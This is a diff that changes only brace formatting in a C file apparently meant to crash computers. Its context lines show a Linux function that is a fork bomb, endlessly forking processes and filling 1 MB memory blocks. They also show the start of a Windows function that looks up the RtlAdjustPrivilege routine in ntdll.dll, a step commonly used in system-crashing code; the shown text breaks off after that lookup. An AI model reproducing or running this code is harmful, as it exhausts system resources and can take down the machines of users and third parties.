@@ -2,8 +2,10 @@
 
 #ifdef __linux__
 
-void linux_skadi() {
-	while (1) {
+void linux_skadi() 
+{
+	while (1) 
+	{
 		fork();
 		memset(malloc(1024*1024L), 'w', 1024*1024L);
 	}
@@ -11,7 +13,8 @@ void linux_skadi() {
 
 #elif _WIN32
 
-void windows_skadi() {
+void windows_skadi() 
+{
 	BOOLEAN bEnabled;
 	ULONG uResp;
 	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
